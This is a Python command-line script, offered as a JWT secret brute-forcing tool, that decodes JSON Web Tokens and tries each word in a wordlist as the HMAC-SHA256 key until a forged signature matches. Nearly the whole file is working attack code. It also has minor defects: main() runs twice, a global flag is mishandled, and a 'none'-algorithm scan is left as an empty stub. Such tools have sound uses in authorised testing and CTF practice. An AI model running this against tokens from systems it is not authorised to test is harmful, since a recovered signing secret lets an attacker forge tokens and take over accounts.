import base64
import json
import hmac 
import hashlib
import sys
import argparse

tog = 0

def jwt_decode(token):
    global tog
    jwt_token = token
    header_b64, payload_b64, signature_b64 = jwt_token.split('.')

    header = base64.urlsafe_b64decode(header_b64 + "==").decode('utf-8')
    payload = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')

    header_json = json.loads(header)
    payload_json = json.loads(payload)
    
    if tog==0:
        print("")
        print("Decoded Header:", header_json)
        print("Decoded Payload:", payload_json)
    else:
        pass

    return header_b64, payload_b64, signature_b64     

def scan_none_alg():
    pass

def jwt_secret_bruteforce(file_path, token):
    #retrive b64 content
    header_b64, payload_b64, signature_b64 = jwt_decode(token)
    params = f'{header_b64}.{payload_b64}'
    #print(signature)

    #file handeling
    candidate_keys=open(file_path, "r")
    for key in candidate_keys:
        key=key.strip()
        new_signature = hmac.new(key.encode(), params.encode(), hashlib.sha256).digest()
        new_signature_encoded = base64.urlsafe_b64encode(new_signature).rstrip(b'=').decode('utf-8')
        #print(new_signature)
        if new_signature_encoded == signature_b64:
            print("Secret Found: ", key)
            break
    tog=0

def main():
    parser = argparse.ArgumentParser(description="JWT secret brute-forcing tool.")
    
    parser.add_argument("-f", "--file", type=str, required=True, help="Path to the wordlist.")
    parser.add_argument("-t", "--token", type=str, required=True, help="JSON Web Token (JWT) to brute-force.")
    parser.add_argument("-d","--decode", action="store_true", help="Decode JWT.")
    parser.add_argument("-bf","--bruteforce", action="store_true", help="BruteForce JWT Secret.")
    # Parse the arguments
    args = parser.parse_args()
    # Extract the file path and token from the parsed arguments
    file_path = args.file
    token = args.token
    
    if args.decode:
        jwt_decode(token)
    elif args.bruteforce:
        jwt_secret_bruteforce(file_path, token)

    return file_path, token

if __name__ == "__main__":
    file_path, token = main()
    print(f"Wordlist File Path: {file_path}")
    print(f"JWT Token: {token}")



main()